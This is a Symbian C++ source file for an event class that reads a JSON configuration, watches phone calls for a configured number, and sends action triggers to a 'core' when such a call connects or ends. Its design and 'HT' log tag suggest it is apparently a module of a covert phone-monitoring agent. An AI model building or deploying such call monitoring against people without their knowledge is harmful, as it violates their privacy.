/*
 * EventCall.cpp
 *
 *  Created on: 06/ott/2010
 *      Author: Giovanna
 */

#include "EventCall.h"
#include "Json.h"

CEventCall::CEventCall(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Call, aTriggerId)
	{
	// No implementation required
	}

CEventCall::~CEventCall()
	{
	//__FLOG(_L("Destructor"));
	delete iCallMonitor;
	//__FLOG(_L("End Destructor"));
	//__FLOG_CLOSE;
	} 

CEventCall* CEventCall::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCall* self = new (ELeave) CEventCall(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventCall* CEventCall::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCall* self = CEventCall::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventCall::ConstructL(const TDesC8& params)
	{
	//__FLOG_OPEN_ID("HT", "EventCall.txt");
	//__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	
	RBuf paramsBuf;
		
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve telephone number
		rootObject->GetStringL(_L("number"),iTelNumber);
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("end"),iCallParams.iExitAction);
			}
		else
			iCallParams.iExitAction = -1;
			
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("repeat"),iCallParams.iRepeatAction);
			rootObject->GetIntL(_L("iter"),iCallParams.iIter);
			rootObject->GetIntL(_L("delay"),iCallParams.iDelay);
			}
		else
			{
			iCallParams.iRepeatAction = -1;
			iCallParams.iIter = 0;
			iCallParams.iDelay = 0;
			}
		//retrieve enable flag
		iEnabled = EFalse;
	    TBuf<8> enableBuf;
		rootObject->GetStringL(_L("enabled"),enableBuf);
		if(enableBuf.Compare(_L("true")) == 0)
			{
			iEnabled = ETrue;
			}
				
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);

	iCallMonitor = CPhoneCallMonitor::NewL(*this);
	}

void CEventCall::StartEventL()
	{
	iWasInMonitoredCall = EFalse;
	
	TBuf<16>  telNumber;
	TInt direction;
	if(iCallMonitor->ActiveCall(direction,telNumber))
		{
		if(iTelNumber.Size()==0)  //we don't have to match a number
			{
			iWasInMonitoredCall = ETrue;
			SendActionTriggerToCoreL();
			}
		else					
			{
			if(telNumber.Length()==0)  // private number calling
				{
				return;
				}
			if(MatchNumber(telNumber))
				{
				iWasInMonitoredCall = ETrue;
				SendActionTriggerToCoreL();
				}
			}
		}
	iCallMonitor->StartListeningForEvents();
	}

// aNumber.Length()==0  when private number calling
void CEventCall::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber)
	{
	if(!iWasInMonitoredCall)
		{
		if(iTelNumber.Size() == 0)
			{
			// no number to match, trigger action
			iWasInMonitoredCall = ETrue;
			SendActionTriggerToCoreL();
			}
		else
			{
			// there's a number to match
			if(aNumber.Length()==0) // private number, do nothing
				{
				return;
				}
			if(MatchNumber(aNumber))
				{
				iWasInMonitoredCall = ETrue;
				SendActionTriggerToCoreL();
				}
			}
		}
	}

void CEventCall::NotifyDisconnectedCallStatusL()
	{
	if(iWasInMonitoredCall)
		{
		iWasInMonitoredCall = EFalse;
		if (iCallParams.iExitAction != -1)						
			SendActionTriggerToCoreL(iCallParams.iExitAction);
		}
	}

void CEventCall::NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber)
	{
	//we are not interested in this
	}

TBool CEventCall::MatchNumber(const TDesC& aNumber)
	{
	if(aNumber.Length() <= iTelNumber.Length())
		{
		if(iTelNumber.Find(aNumber) != KErrNotFound)
			{
			return ETrue;
			}
		}
	else
		{
		if(aNumber.Find(iTelNumber) != KErrNotFound)
			{
			return ETrue;
			}
		}
	return EFalse;
	}
